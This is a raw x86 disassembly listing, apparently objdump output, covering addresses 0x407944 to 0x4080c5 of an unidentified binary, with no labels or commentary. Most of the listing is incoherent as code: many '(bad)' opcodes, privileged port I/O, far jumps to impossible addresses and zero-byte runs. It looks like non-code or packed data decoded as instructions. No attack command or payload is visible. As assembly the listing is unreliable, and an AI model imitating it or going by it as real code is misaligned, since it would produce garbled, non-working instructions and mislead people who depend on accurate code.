  407944:	jno    0x407944
  407946:	in     al,0x5
  407948:	ja     0x40794a
  40794a:	in     eax,dx
  40794b:	add    eax,0x5eb0077
  407950:	ja     0x407950
  407952:	in     al,dx
  407953:	push   DWORD PTR [eax+eax*1-0x15]
  407957:	push   DWORD PTR [ebp+0x3]
  40795a:	call   0xe443ed61
  40795f:	(bad)  
  407960:	xchg   ebp,eax
  407961:	jecxz  0x40794b
  407963:	add    dh,BYTE PTR [esi-0x4]
  407966:	jmp    0x40796d
  40796b:	add    BYTE PTR [eax],al
  40796d:	jbe    0x407970
  40796f:	jmp    0x7602:0xea017602
  407976:	(bad)  
  407977:	jmp    0xea41e97e
  40797c:	add    dh,BYTE PTR [esi+0x1]
  40797f:	call   0xe841ed88
  407984:	add    dh,BYTE PTR [ecx+eax*1-0x18]
  407988:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  40798c:	add    dh,BYTE PTR [edx+eax*1+0x7a]
  407990:	ret    
  407991:	jb     0x407a0e
  407993:	xlat   BYTE PTR ds:[ebx]
  407994:	mov    eax,0xf5517072
  407999:	sbb    eax,0x6e5bddf4
  40799e:	sbb    BYTE PTR [ebx+0x59c38310],ah
  4079a4:	pop    ds
  4079a5:	stc    
  4079a6:	pop    edi
  4079a7:	and    BYTE PTR [ecx-0x49],bh
  4079aa:	cs test esi,ebx
  4079ad:	cld    
  4079ae:	pusha  
  4079af:	stc    
  4079b0:	push   ecx
  4079b1:	into   
  4079b2:	sub    al,0xab
  4079b4:	xchg   BYTE PTR [ecx+ebx*1],dh
  4079b7:	ins    DWORD PTR es:[edi],dx
  4079b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b9:	arpl   WORD PTR [edi+0x46d27f74],di
  4079bf:	add    ch,ah
  4079c1:	sub    DWORD PTR [eax-0x7a08eed7],esi
  4079c7:	add    edx,edi
  4079c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ca:	inc    ecx
  4079cb:	das    
  4079cc:	push   edi
  4079ce:	cld    
  4079cf:	push   ds
  4079d0:	xchg   esi,eax
  4079d1:	add    BYTE PTR [eax],al
  4079d3:	add    BYTE PTR [eax],al
  4079d5:	add    BYTE PTR [esi+0x7607edc3],dh
  4079db:	mov    ch,0x15
  4079dd:	adc    esi,ebx
  4079df:	pop    edx
  4079e0:	clc    
  4079e1:	mov    bl,0x55
  4079e3:	fs dec esi
  4079e5:	idiv   BYTE PTR [eax+0x2b]
  4079e8:	rcr    al,1
  4079ea:	mov    ?,WORD PTR ds:0x73ec132a
  4079f0:	xor    ch,BYTE PTR [ebp+eax*4-0x22]
  4079f4:	jmp    edx
  4079f6:	div    BYTE PTR ds:0xa8f2909b
  4079fc:	add    BYTE PTR [eax-0x4],dh
  4079ff:	shl    DWORD PTR [ecx-0x3e],1
  407a02:	sbb    DWORD PTR [esi+0x27a8a893],0x67f2bd6d
  407a0c:	xor    bl,BYTE PTR [ebp-0x7c]
  407a0f:	ja     0x407a43
  407a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a12:	test   BYTE PTR [edi+0x32],al
  407a15:	mov    ebp,0x85325784
  407a1a:	fs daa 
  407a1c:	xor    bh,BYTE PTR [ebp-0x51]
  407a1f:	or     DWORD PTR [eax-0x3a1bdb5f],eax
  407a25:	xchg   ecx,eax
  407a26:	cmp    ebp,ecx
  407a28:	mov    dh,0xf4
  407a2a:	xlat   BYTE PTR ds:[ebx]
  407a2b:	mov    ds:0x28fd2d79,eax
  407a30:	mov    ebp,0x31fb7cd9
  407a35:	jle    0x4079c5
  407a37:	in     al,0x32
  407a39:	lds    eax,FWORD PTR [eax]
  407a3b:	add    BYTE PTR [eax],al
  407a3d:	add    BYTE PTR [eax],al
  407a3f:	daa    
  407a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a41:	xor    al,BYTE PTR [eax]
  407a43:	call   0x9873f577
  407a48:	xor    BYTE PTR [ebx-0x64cf47cd],cl
  407a4e:	xor    edi,eax
  407a50:	das    
  407a51:	imul   ecx,DWORD PTR [esi],0xd39ab90c
  407a57:	gs or  bh,ah
  407a5a:	push   0xfaddada6
  407a5f:	out    dx,al
  407a60:	add    al,0xe7
  407a62:	xor    esi,DWORD PTR [ebx-0x74]
  407a65:	sub    BYTE PTR [eax+0x1a5873d4],ah
  407a6b:	mov    eax,0xb8341b22
  407a70:	and    ch,BYTE PTR [ebx]
  407a72:	xor    al,0x68
  407a74:	xor    bh,BYTE PTR [ebx]
  407a76:	xor    al,0x98
  407a78:	xor    cl,BYTE PTR [ebx+0x34]
  407a7b:	js     0x407aaf
  407a7d:	pop    ebx
  407a7e:	test   DWORD PTR [esi],0x6cc7b32f
  407a84:	enter  0x9cb0,0xe7
  407a88:	pop    ebx
  407a89:	inc    ebx
  407a8a:	sti    
  407a8b:	loop   0x407a8a
  407a8d:	and    al,0xfe
  407a8f:	inc    eax
  407a90:	push   ecx
  407a91:	les    ebx,FWORD PTR [ecx+0xd67213]
  407a97:	xor    BYTE PTR [edx],dh
  407a99:	retf   
  407a9a:	xor    al,0xb8
  407a9c:	xor    ebx,ebx
  407a9e:	xor    al,0xf8
  407aa0:	xor    ch,bl
  407aa2:	xor    al,0x0
  407aa4:	add    BYTE PTR [eax],al
  407aa6:	add    BYTE PTR [eax],al
  407aa8:	call   0x587575df
  407aad:	and    DWORD PTR [ebx],ecx
  407aaf:	xor    eax,0x662a00ff
  407ab4:	out    0xd2,eax
  407ab6:	mov    ebp,0x5963f6ca
  407abb:	inc    esi
  407abc:	pop    esi
  407abd:	pop    ebx
  407abe:	loopne 0x407a5e
  407ac0:	jne    0x407a92
  407ac2:	xor    DWORD PTR [ebx],edx
  407ac4:	jb     0x407a74
  407ac6:	jb     0x407b45
  407ac8:	jns    0x407a5d
  407aca:	xlat   BYTE PTR ds:[ebx]
  407acb:	jnp    0x407b35
  407acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ace:	out    dx,al
  407acf:	mov    esp,DWORD PTR [eax-0x31]
  407ad2:	out    dx,al
  407ad3:	fwait
  407ad4:	dec    eax
  407ad5:	xchg   edi,ebp
  407ad7:	stos   DWORD PTR es:[edi],eax
  407ad8:	inc    eax
  407ad9:	iret   
  407ada:	out    dx,al
  407adb:	mov    ebx,0x42ace748
  407ae0:	ins    DWORD PTR es:[edi],dx
  407ae1:	xor    DWORD PTR [ebx-0x71],ecx
  407ae4:	mov    cl,0x11
  407ae6:	sbb    al,0x74
  407ae8:	ins    DWORD PTR es:[edi],dx
  407ae9:	test   al,0x89
  407aeb:	adc    ecx,edi
  407aed:	inc    esp
  407aee:	xor    dl,bl
  407af0:	sub    ah,bl
  407af2:	xor    al,0xe8
  407af4:	shl    BYTE PTR [ecx+edx*1+0x14],0x83
  407af9:	pmaxsw mm7,QWORD PTR [ebx]
  407afc:	mov    esp,edi
  407afe:	in     eax,dx
  407aff:	dec    ebx
  407b00:	sub    edi,0xffffffed
  407b03:	pop    ebx
  407b04:	imul   eax,edi,0xffffffed
  407b07:	imul   esp,DWORD PTR [ebx-0x11],0xffffffed
  407b0b:	mov    esp,0x0
  407b10:	add    BYTE PTR [ecx+edi*2-0x518ad7d8],ch
  407b17:	popf   
  407b18:	aaa    
  407b19:	jnp    0x407b99
  407b1b:	pop    eax
  407b1c:	cdq    
  407b1d:	jae    0x407ad9
  407b1f:	add    DWORD PTR [esi],edx
  407b21:	mov    dh,0xbd
  407b23:	add    BYTE PTR [esi-0x54b72767],al
  407b29:	mov    BYTE PTR [edi-0x505c1413],0xec
  407b30:	sti    
  407b31:	stos   DWORD PTR es:[edi],eax
  407b32:	daa    
  407b33:	in     al,dx
  407b34:	or     esp,DWORD PTR [edx-0x75e413b1]
  407b3a:	inc    edi
  407b3b:	in     al,dx
  407b3c:	sub    ecx,ecx
  407b3e:	add    bh,BYTE PTR [esi]
  407b40:	ins    DWORD PTR es:[edi],dx
  407b41:	inc    eax
  407b42:	lods   eax,DWORD PTR ds:[esi]
  407b43:	mov    ecx,0x7dca2990
  407b48:	je     0x407b2e
  407b4a:	pop    ds
  407b4b:	lods   al,BYTE PTR ds:[esi]
  407b4c:	mov    ds:0x13bab813,eax
  407b51:	mov    ebp,DWORD PTR [esi+0x2b2bc689]
  407b57:	sub    ebp,esp
  407b59:	out    dx,al
  407b5a:	clc    
  407b5b:	test   ah,ch
  407b5d:	fdivp  st(0),st
  407b5f:	pop    esp
  407b60:	in     al,dx
  407b61:	mov    esi,0x2eec24f8
  407b66:	stc    
  407b67:	cmp    al,0xec
  407b69:	into   
  407b6a:	clc    
  407b6b:	dec    ecx
  407b6c:	aad    0xdd
  407b6e:	xor    DWORD PTR [eax],0x38901be1
  407b74:	adc    al,BYTE PTR [eax]
  407b76:	add    BYTE PTR [eax],al
  407b78:	add    BYTE PTR [eax],al
  407b7a:	xor    bl,0x0
  407b7d:	(bad)  
  407b7e:	mov    ebp,0x2b7bc061
  407b83:	pop    DWORD PTR [ebp-0x316e2ee9]
  407b89:	add    BYTE PTR [ecx-0x7],ah
  407b8c:	hlt    
  407b8d:	cli    
  407b8e:	push   esi
  407b8f:	stc    
  407b90:	cld    
  407b91:	cli    
  407b92:	data16 stc 
  407b94:	add    al,0xfb
  407b96:	ss stc 
  407b98:	sub    al,0xfb
  407b9a:	inc    esi
  407b9b:	stc    
  407b9c:	adc    al,0xb1
  407b9e:	inc    ecx
  407b9f:	jae    0x407b49
  407ba1:	push   0x78e03e2f
  407ba6:	dec    ebx
  407ba7:	sub    al,0x39
  407ba9:	fistp  DWORD PTR [esp+ebx*2]
  407bac:	xchg   ebx,eax
  407bad:	gs push cs
  407baf:	lea    ebp,[ebp-0x4c]
  407bb2:	out    dx,eax
  407bb3:	mov    al,0x5b
  407bb5:	pop    ebp
  407bb6:	adc    ch,dh
  407bb8:	inc    esp
  407bb9:	icebp  
  407bba:	or     ch,dh
  407bbc:	push   DWORD PTR [esp+eax*2]
  407bbf:	xor    bh,bh
  407bc1:	jmp    0xa63fabcc
  407bc6:	jns    0x407bca
  407bc8:	add    BYTE PTR [ebp+0x1a830542],bl
  407bce:	push   ebp
  407bcf:	scas   eax,DWORD PTR es:[edi]
  407bd0:	mul    ah
  407bd2:	cmp    dl,BYTE PTR [edi+0x47dc86c7]
  407bd8:	ret    0x92b2
  407bdb:	mov    ch,0xfc
  407bdd:	rol    DWORD PTR [eax],1
  407bdf:	add    BYTE PTR [eax],al
  407be1:	add    BYTE PTR [eax],al
  407be3:	data16 test BYTE PTR [esp+ecx*2-0x12ba072a],al
  407beb:	std    
  407bec:	pop    es
  407bed:	xor    eax,0x34fffded
  407bf2:	(bad)
  407bf5:	xor    al,0x99
  407bf7:	in     eax,dx
  407bf8:	mov    bl,0x34
  407bfa:	sbb    ebp,0xfbece9ab
  407c00:	cli    
  407c01:	rcr    DWORD PTR [esi],0x7f
  407c04:	cmp    al,ah
  407c06:	push   ebp
  407c07:	mov    ecx,ds
  407c09:	out    0x59,eax
  407c0b:	out    dx,eax
  407c0c:	bound  ebx,QWORD PTR gs:[ebx]
  407c0f:	in     al,dx
  407c10:	sbb    DWORD PTR [esi-0x746a84b],0xffffffee
  407c17:	scas   eax,DWORD PTR es:[edi]
  407c18:	lahf   
  407c19:	ss cmp eax,0x3d36b79e
  407c1f:	sahf   
  407c20:	scas   eax,DWORD PTR es:[edi]
  407c21:	ss ins DWORD PTR es:[edi],dx
  407c23:	pop    DWORD PTR [edi+0x7f8f5d37]
  407c29:	aaa    
  407c2a:	(bad)  
  407c2b:	and    al,0x9a
  407c2d:	inc    esp
  407c2e:	adc    DWORD PTR [ecx+0x417f65e0],esp
  407c34:	cwde   
  407c35:	and    al,dh
  407c37:	faddp  st(6),st
  407c39:	jmp    0x4a0c53e
  407c3e:	fld    TBYTE PTR [eax+0x1f]
  407c41:	and    BYTE PTR [eax-0x5e],0x54
  407c45:	mov    bl,0x39
  407c47:	add    BYTE PTR [eax],al
  407c49:	add    BYTE PTR [eax],al
  407c4b:	add    BYTE PTR [esi+ebx*1+0x1ce03a83],al
  407c52:	mov    bh,0x3a
  407c54:	fcomp  DWORD PTR [edi+edi*4]
  407c57:	cmp    ah,BYTE PTR [eax+0x1d]
  407c5a:	(bad)  
  407c5b:	cmp    cl,BYTE PTR [eax-0x1b46bba3]
  407c61:	sub    BYTE PTR es:[ecx+0x5bbe4ff8],cl
  407c68:	cdq    
  407c69:	jb     0x407c73
  407c6b:	cmp    BYTE PTR [edx],0xf6
  407c6e:	sbb    eax,0xf576f34f
  407c73:	ret    
  407c74:	cmp    cl,BYTE PTR [edx]
  407c76:	in     eax,0x3b
  407c78:	test   al,0x20
  407c7a:	fistp  QWORD PTR [ebx]
  407c7c:	jo     0x407c9e
  407c7e:	pop    es
  407c7f:	cmp    al,0xec
  407c81:	push   ds
  407c82:	arpl   WORD PTR [esp+eax*1],di
  407c85:	pop    ds
  407c86:	imul   edi,DWORD PTR [esp+ebx*8],0xffffff82
  407c8a:	inc    esp
  407c8b:	push   esi
  407c8c:	sub    ecx,DWORD PTR [eax-0x43bb601b]
  407c92:	lods   eax,DWORD PTR ds:[esi]
  407c93:	dec    esp
  407c94:	ficom  WORD PTR [edi+0x2a]
  407c97:	cmp    BYTE PTR [esi-0x1d],bl
  407c9a:	fstp   TBYTE PTR ds:[eax-0x10]
  407c9e:	and    ebp,DWORD PTR fs:[ebx-0x5fef08f9]
  407ca5:	xor    DWORD PTR [edi],esi
  407ca7:	aas    
  407ca8:	mov    BYTE PTR [ecx],dh
  407caa:	jnp    0x407ceb
  407cac:	sbb    al,0x31
  407cae:	cmp    DWORD PTR [edi],0x0
  407cb1:	add    BYTE PTR [eax],al
  407cb3:	add    BYTE PTR [eax],al
  407cb5:	add    al,0x31
  407cb7:	mov    ds:0x928c3f,eax
  407cbc:	xor    DWORD PTR [ebp+0x61],0x19ad89e6
  407cc3:	cld    
  407cc4:	adc    BYTE PTR [ecx],bl
  407cc6:	xor    al,0x8f
  407cc8:	pop    es
  407cc9:	adc    al,0xfe
  407ccb:	sub    eax,0x3347a335
  407cd0:	out    dx,al
  407cd1:	leave  
  407cd2:	out    dx,eax
  407cd3:	(bad)  
  407cd4:	(bad)  
  407cd5:	(bad)  
  407cd6:	stc    
  407cd7:	idiv   DWORD PTR [ecx-0x7f]
  407cda:	sahf   
  407cdb:	imul   DWORD PTR [ebp-0x2d076e97]
  407ce1:	popa   
  407ce2:	aam    0xf7
  407ce4:	dec    esi
  407ce5:	push   0x609af655
  407cea:	out    dx,eax
  407ceb:	pop    ds
  407cec:	(bad)  
  407ced:	cmp    BYTE PTR [edx+0x5b],dl
  407cf0:	mov    ebx,0x41645409
  407cf5:	call   0x4500dc89
  407cfa:	inc    edi
  407cfb:	add    DWORD PTR [esi-0x41224f02],esi
  407d01:	rol    DWORD PTR [ecx-0x6],cl
  407d04:	or     DWORD PTR [edx-0x5dd407df],ebp
  407d0a:	xchg   esi,eax
  407d0b:	clc    
  407d0c:	jae    0x407c98
  407d0e:	add    al,0xf9
  407d10:	sbb    al,0x8d
  407d12:	add    ebp,esp
  407d14:	and    bh,BYTE PTR [edx+esi*8+0x20]
  407d18:	mov    ds:0x0,al
  407d1d:	add    dl,bl
  407d1f:	sub    eax,0x70214d06
  407d24:	in     eax,dx
  407d25:	pop    ebp
  407d26:	sbb    DWORD PTR [edx],esp
  407d28:	mov    DWORD PTR [edx],edx
  407d2a:	sub    bh,dh
  407d2c:	xchg   ebp,eax
  407d2d:	xchg   DWORD PTR [edi],ecx
  407d2f:	dec    ah
  407d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d32:	mov    edi,DWORD PTR [ecx+0x77]
  407d35:	mov    ds:0x18ec1a4f,eax
  407d3a:	add    al,BYTE PTR ds:[esi]
  407d3d:	in     eax,dx
  407d3e:	inc    ecx
  407d3f:	jmp    0xe9646a25
  407d44:	mov    al,0xec
  407d46:	xchg   ebx,eax
  407d47:	out    dx,al
  407d48:	pop    ds
  407d49:	lock clc 
  407d4b:	stos   BYTE PTR es:[edi],al
  407d4c:	int3   
  407d4d:	jno    0x407d17
  407d4f:	arpl   WORD PTR [ebp-0xd714cdb],dx
  407d55:	mov    WORD PTR [ecx+edi*2+0x12d69e9a],ds
  407d5c:	fimul  DWORD PTR [ebx+0x7]
  407d5f:	addr16 mov al,0x5e
  407d62:	jg     0x407d65
  407d64:	loope  0x407d54
  407d66:	jnp    0x407d57
  407d68:	out    dx,eax
  407d69:	out    dx,al
  407d6a:	sub    edi,0x10
  407d6d:	out    dx,eax
  407d6e:	dec    ebx
  407d6f:	out    dx,eax
  407d70:	hlt    
  407d71:	out    dx,al
  407d72:	push   edx
  407d73:	out    dx,eax
  407d74:	lods   eax,DWORD PTR ds:[esi]
  407d75:	out    dx,al
  407d76:	mov    gs,WORD PTR [ecx+edi*8-0x21]
  407d7a:	out    dx,eax
  407d7b:	outs   dx,DWORD PTR ds:[esi]
  407d7c:	mov    ebx,eax
  407d7e:	mov    esp,0x5a9eef
  407d83:	add    BYTE PTR [eax],al
  407d85:	add    BYTE PTR [eax],al
  407d87:	in     eax,0xff
  407d89:	sub    DWORD PTR [ecx],edi
  407d8b:	mov    bl,0x3c
  407d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8e:	and    BYTE PTR [edx+edi*1],dl
  407d91:	outs   dx,BYTE PTR ds:[esi]
  407d92:	sub    BYTE PTR [edi],bl
  407d94:	push   esp
  407d95:	xor    al,0xf3
  407d97:	(bad)  
  407d99:	out    dx,al
  407d9a:	repnz arpl bx,si
  407d9d:	(bad)  
  407d9e:	repnz xor bl,0x41
  407da2:	cmc    
  407da3:	push   edx
  407da4:	repz push ebp
  407da6:	cmc    
  407da7:	add    BYTE PTR [edx],al
  407da9:	jg     0x407df2
  407dab:	lods   eax,DWORD PTR ds:[esi]
  407dac:	mov    bl,0xd6
  407dae:	xchg   edx,eax
  407daf:	pushf  
  407db0:	out    dx,al
  407db1:	call   0x37f2cdaf
  407db6:	pop    esi
  407db7:	sar    ecx,0xff
  407dba:	lock popa 
  407dbc:	icebp  
  407dbd:	jbe    0x407df0
  407dbf:	out    dx,eax
  407dc0:	jo     0x407dea
  407dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dc3:	mov    WORD PTR [eax*4-0x1704cd05],es
  407dca:	mov    bl,0x19
  407dcc:	or     DWORD PTR [edx],0x1f
  407dcf:	add    bl,bh
  407dd1:	ins    DWORD PTR es:[edi],dx
  407dd2:	pushf  
  407dd3:	daa    
  407dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd5:	pop    es
  407dd6:	mov    al,0xa2
  407dd8:	adc    ebx,esi
  407dda:	push   eax
  407ddb:	aam    0x17
  407ddd:	jecxz  0x407e40
  407ddf:	sbb    dl,BYTE PTR [esi+0x2a]
  407de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407de3:	shl    DWORD PTR ds:0xcede5aec,0xdd
  407dea:	rol    BYTE PTR [eax],1
  407dec:	add    BYTE PTR [eax],al
  407dee:	add    BYTE PTR [eax],al
  407df0:	xor    BYTE PTR [edi+0x14090e24],bl
  407df6:	(bad)  [eax+ebp*8]
  407df9:	test   eax,0xe6bb6436
  407dfe:	cs jae 0x407e10
  407e01:	fist   WORD PTR [edi-0x37]
  407e04:	xor    BYTE PTR [esi-0x5a],dh
  407e07:	js     0x407e23
  407e09:	std    
  407e0a:	outs   dx,BYTE PTR ds:[esi]
  407e0b:	fld    TBYTE PTR [ecx-0x484a81d]
  407e11:	sub    al,0x96
  407e13:	xchg   esi,eax
  407e14:	ds dec edx
  407e16:	xchg   edi,eax
  407e17:	pop    esi
  407e18:	mov    bh,dh
  407e1a:	test   al,0x85
  407e1c:	mov    ebx,0xb7671232
  407e21:	lods   eax,DWORD PTR es:[esi]
  407e23:	daa    
  407e24:	add    eax,0x3b38face
  407e29:	pushf  
  407e2a:	loopne 0x407df6
  407e2c:	sub    al,0x9d
  407e2e:	je     0x407e68
  407e30:	daa    
  407e31:	xchg   ecx,eax
  407e32:	dec    eax
  407e33:	or     DWORD PTR [eax+eiz*8+0x44d00037],eax
  407e3a:	xor    ah,dl
  407e3c:	cmc    
  407e3d:	retf   
  407e3e:	dec    ecx
  407e3f:	das    
  407e40:	das    
  407e41:	mov    edi,0x6f3d53f5
  407e46:	xor    al,0x99
  407e48:	mov    ch,0x16
  407e4a:	cmp    ch,ah
  407e4c:	outs   dx,BYTE PTR ds:[esi]
  407e4d:	ficom  DWORD PTR es:[edi+edx*8+0xbce68f]
  407e55:	add    BYTE PTR [eax],al
  407e57:	add    BYTE PTR [eax],al
  407e59:	je     0x407e2f
  407e5b:	and    BYTE PTR [ecx+0x58],dl
  407e5e:	test   eax,0x7a71e09c
  407e63:	test   DWORD PTR [ebp+0x29584824],eax
  407e69:	push   ebp
  407e6a:	cdq    
  407e6b:	lahf   
  407e6c:	pop    ecx
  407e6d:	sbb    al,0x41
  407e6f:	pop    ss
  407e70:	jecxz  0x407e6a
  407e72:	(bad)  
  407e73:	pusha  
  407e74:	daa    
  407e75:	pop    ds
  407e76:	jmp    0xea97:0x484b3cf
  407e7d:	inc    esi
  407e7e:	pop    es
  407e7f:	jns    0x407e53
  407e81:	std    
  407e82:	out    dx,eax
  407e83:	push   eax
  407e84:	loop   0x407e9c
  407e86:	inc    esi
  407e87:	mov    WORD PTR [bp+di],es
  407e8a:	cdq    
  407e8b:	adc    DWORD PTR [esi-0x372ba021],0xb31ad54d
  407e95:	and    bl,BYTE PTR [eax+0x5009ace0]
  407e9b:	test   DWORD PTR [edx+ebp*8+0xadfaca3],edi
  407ea2:	xchg   DWORD PTR [edi+0x487b9f2],eax
  407ea8:	adc    eax,0x7c5b7f9d
  407ead:	dec    ebp
  407eae:	movhps xmm6,QWORD PTR [edx]
  407eb1:	jno    0x407eac
  407eb3:	int3   
  407eb4:	std    
  407eb5:	jne    0x407f15
  407eb7:	ds out 0x4d,eax
  407eba:	inc    edx
  407ebb:	jmp    0x407faa
  407ec0:	add    BYTE PTR [eax],al
  407ec2:	xchg   BYTE PTR [ecx-0x31],dh
  407ec5:	mov    ah,0x4e
  407ec7:	or     al,dh
  407ec9:	jno    0x407f14
  407ecb:	sti    
  407ecc:	out    dx,eax
  407ecd:	sub    BYTE PTR [ecx+0x5],al
  407ed0:	lock sub BYTE PTR [esp+esi*2-0x4110562e],ah
  407ed8:	and    DWORD PTR [ebp-0x4d881592],eax
  407ede:	cmp    eax,DWORD PTR [ebx-0x5e1c4744]
  407ee4:	vcmppd xmm4,xmm4,XMMWORD PTR [esi],0x98
  407ee9:	inc    ecx
  407eea:	jg     0x407e8a
  407eec:	out    dx,eax
  407eed:	ror    WORD PTR [esi+eax*1-0x5],1
  407ef2:	out    0x16,al
  407ef4:	mov    al,ds:0x77081b8a
  407ef9:	ss repnz dec esi
  407efc:	sbb    ebx,ebp
  407efe:	mov    edx,0x5b22f776
  407f03:	data16 adc bl,BYTE PTR [ebp+0x78]
  407f07:	push   edx
  407f08:	fld    TBYTE PTR [eax+0x3505c56b]
  407f0e:	xchg   ebx,eax
  407f0f:	sbb    dh,BYTE PTR [eax+0x25]
  407f12:	mov    bh,0x14
  407f14:	mov    al,0xc1
  407f16:	and    ecx,edx
  407f18:	out    0xd8,al
  407f1a:	popa   
  407f1b:	enter  0xde61,0xe8
  407f1f:	inc    ecx
  407f20:	push   ebp
  407f21:	in     eax,0xa7
  407f23:	ss or  eax,0x73
  407f29:	add    BYTE PTR [eax],al
  407f2b:	lahf   
  407f2c:	or     bl,cl
  407f2e:	in     eax,0x81
  407f30:	jg     0x407f68
  407f32:	cmp    al,0xc6
  407f34:	iret   
  407f35:	mov    ds:0x5302c65d,eax
  407f3a:	cmp    dh,ch
  407f3c:	mov    ds:0x9806dde6,al
  407f41:	call   0xe942f449
  407f46:	add    esi,DWORD PTR [ebp+0x2]
  407f49:	jmp    0xe942f451
  407f4e:	add    esi,DWORD PTR [ebp+0x2]
  407f51:	jmp    0xe942f459
  407f56:	add    esi,DWORD PTR [edx+eax*1-0x27]
  407f5a:	jmp    0x78358201
  407f5f:	mov    ch,0x2
  407f61:	fisubr WORD PTR [edx-0x4b]
  407f64:	add    dh,BYTE PTR [ebp-0x11fd4a96]
  407f6a:	imul   esi,DWORD PTR [ebp-0x4a96a8fe],0xc6040702
  407f74:	add    bh,cl
  407f76:	add    eax,edi
  407f78:	add    bl,BYTE PTR ds:0xc5026304
  407f7e:	add    ebx,DWORD PTR [ecx+0x7503c502]
  407f84:	add    bl,ah
  407f86:	stc    
  407f87:	imul   edi,esp,0x27503e8
  407f8d:	stc    
  407f8e:	inc    BYTE PTR [eax]
  407f90:	add    BYTE PTR [eax],al
  407f92:	add    BYTE PTR [eax],al
  407f94:	jl     0x407f8d
  407f96:	loop   0x407f9b
  407f98:	jne    0x407f9c
  407f9a:	add    al,0xac
  407f9c:	cli    
  407f9d:	sub    ah,dh
  407f9f:	stc    
  407fa0:	repnz sub bl,ah
  407fa3:	jecxz  0x407f8f
  407fa5:	sub    BYTE PTR [ebp-0x45fdd3fd],ch
  407fab:	add    eax,DWORD PTR [ebp+0x2]
  407fae:	mov    ch,0x3
  407fb0:	xor    al,0x2
  407fb2:	mov    al,ds:0x27503
  407fb7:	jmp    0xb3404218
  407fbc:	jbe    0x407f84
  407fbe:	(bad)  
  407fbf:	call   0x8840823a
  407fc4:	jno    0x40802a
  407fc6:	add    BYTE PTR [edx+0x45000279],cl
  407fcc:	jno    0x407f69
  407fce:	(bad)  
  407fcf:	cmp    DWORD PTR [ecx-0x4e],edi
  407fd2:	dec    DWORD PTR [ecx+esi*2-0x5d]
  407fd6:	jmp    FWORD PTR [edi]
  407fd8:	jns    0x407f92
  407fda:	inc    DWORD PTR [edi+0x71]
  407fdd:	xchg   edi,eax
  407fde:	dec    DWORD PTR [ebx]
  407fe0:	jns    0x407fe4
  407fe2:	add    BYTE PTR [edx],bh
  407fe4:	jno    0x407f8f
  407fe6:	call   FWORD PTR [ecx]
  407fe8:	jns    0x407fa0
  407fea:	(bad)  
  407feb:	push   DWORD PTR [ecx-0x4d]
  407fee:	(bad)  
  407fef:	cld    
  407ff0:	jbe    0x407fc2
  407ff2:	dec    DWORD PTR [edi]
  407ff4:	jno    0x407f93
  407ff6:	(bad)  
  407ff7:	std    
  407ff8:	add    BYTE PTR [eax],al
  407ffa:	add    BYTE PTR [eax],al
  407ffc:	add    BYTE PTR [esi-0xd],dh
  407fff:	(bad)  
  408000:	mov    edx,0xb4000276
  408005:	jbe    0x407fc5
  408007:	jmp    FWORD PTR [edi-0x3b003c8a]
  40800d:	jbe    0x407fa8
  40800f:	inc    ebx
  408011:	jbe    0x407fab
  408013:	(bad)  
  408014:	mov    esp,0xaa000276
  408019:	jbe    0x407fb4
  40801b:	dec    ecx
  40801d:	jbe    0x407fbc
  40801f:	(bad)  
  408020:	mov    edx,0xbbff9776
  408025:	jbe    0x407fe0
  408027:	push   DWORD PTR [ebp-0x7300678a]
  40802d:	jbe    0x407fef
  40802f:	call   FWORD PTR [edx-0x5e8a]
  408035:	jmp    0xdc40e53d
  40803a:	add    eax,DWORD PTR [eax]
  40803c:	add    BYTE PTR [edi],cl
  40803e:	add    al,0x6f
  408040:	add    BYTE PTR [edx],bh
  408042:	add    esi,DWORD PTR [ebx+0x0]
  408045:	dec    ebx
  408046:	(bad)  
  408047:	imul   eax,DWORD PTR [eax],0x31
  40804a:	(bad)  
  40804b:	push   esi
  40804c:	add    BYTE PTR ds:0x30006dfe,dh
  408052:	(bad)  
  408053:	outs   dx,BYTE PTR ds:[esi]
  408054:	add    BYTE PTR [ebx-0x2],dl
  408057:	inc    edx
  408058:	add    BYTE PTR [eax],bh
  40805a:	(bad)  
  40805b:	pusha  
  40805c:	add    BYTE PTR [edi],bh
  40805e:	(bad)  
  40805f:	jb     0x408061
  408061:	add    BYTE PTR [eax],al
  408063:	add    BYTE PTR [eax],al
  408065:	add    BYTE PTR [ebx+eax*1+0x33f0000],cl
  40806c:	xor    eax,DWORD PTR [eax]
  40806e:	dec    esi
  40806f:	add    esi,DWORD PTR [edi]
  408071:	add    BYTE PTR [edx+0x3],al
  408074:	cmp    BYTE PTR [eax],al
  408076:	dec    esp
  408077:	add    eax,DWORD PTR [eax]
  408079:	add    BYTE PTR [edi-0x2],ch
  40807c:	js     0x40807e
  40807e:	dec    edi
  40807f:	add    edx,DWORD PTR [ebx+0x0]
  408082:	je     0x408082
  408084:	pusha  
  408085:	add    BYTE PTR [eax-0x2],dh
  408088:	outs   dx,BYTE PTR ds:[esi]
  408089:	add    BYTE PTR [ebx+0x3],dl
  40808c:	add    BYTE PTR [eax],al
  40808e:	shl    BYTE PTR [ebp+0x57],cl
  408091:	dec    ebp
  408092:	rol    DWORD PTR [edx],1
  408094:	add    BYTE PTR [eax],al
  408096:	inc    ebx
  408097:	push   0x40
  408099:	add    cl,dl
  40809b:	sub    eax,DWORD PTR [eax+0x0]
  40809e:	ret    
  40809f:	imul   eax,DWORD PTR [eax+0x0],0x402c67
  4080a6:	mov    ch,0xc
  4080a8:	inc    ecx
  4080a9:	add    BYTE PTR [eax+0x7800410c],cl
  4080af:	or     al,0x41
  4080b1:	add    BYTE PTR [ebp-0x3],dh
  4080b4:	sbb    DWORD PTR [ecx+0x75],eax
  4080b7:	add    bl,BYTE PTR [edx]
  4080b9:	inc    ecx
  4080ba:	jne    0x40803f
  4080bc:	cli    
  4080bd:	inc    eax
  4080be:	jne    0x408093
  4080c0:	stc    
  4080c1:	inc    eax
  4080c2:	jne    0x4080ac
  4080c4:	stc    
  4080c5:	inc    eax
